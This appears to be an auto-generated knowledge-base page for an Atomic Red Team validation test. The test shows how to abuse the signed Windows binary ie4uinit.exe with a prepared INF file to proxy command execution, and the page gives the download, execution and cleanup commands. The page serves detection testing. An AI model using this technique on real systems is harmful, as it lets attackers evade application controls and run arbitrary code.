---
atomic_guid: "13c0804e-615e-43ad-b223-2dfbacd0b0b3"
title: "Lolbas ie4uinit.exe use as proxy"
framework: "atomic"
generated: "true"
attack_technique_id: "T1218"
attack_technique_name: "Signed Binary Proxy Execution"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml"
build_date: "2026-04-27 19:12:27"
executor: "command_prompt"
aliases:
  - "13c0804e-615e-43ad-b223-2dfbacd0b0b3"
  - "Lolbas ie4uinit.exe use as proxy"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Executes commands from a specially prepared ie4uinit.inf file.
Poc from : https://bohops.com/2018/03/10/leveraging-inf-sct-fetch-execute-techniques-for-bypass-evasion-persistence-part-2/
Reference: https://lolbas-project.github.io/lolbas/Binaries/Ie4uinit/

## ATT&CK Mapping

- [[kb/attack/techniques/T1218-system_binary_proxy_execution|T1218: System Binary Proxy Execution]]

## Input Arguments

### Path_ie4uinit

- description: Path to ie4uinit.exe
- type: path
- default: c:\windows\system32\ie4uinit.exe

### Path_inf

- description: Path to the cab file
- type: path
- default: PathToAtomicsFolder\T1218\src\ieuinit.inf

## Dependencies

ieuinit.inf must exist on disk at specified location (#{Path_inf})

### Prerequisite Check

```powershell
if (Test-Path "#{Path_inf}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory (split-path "#{Path_inf}") -ErrorAction ignore | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218/src/ieuinit.inf" -OutFile "#{Path_inf}"
```

## Executor

- name: command_prompt

### Command

```cmd
copy #{Path_ie4uinit} %TEMP%\ie4uinit.exe
copy "#{Path_inf}" %TEMP%\ieuinit.inf
%TEMP%\ie4uinit.exe -BaseSettings
```

### Cleanup

```cmd
del %TEMP%\ie4uinit.exe >nul 2>&1
del %TEMP%\ieuinit.inf >nul 2>&1
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218/T1218.yaml)
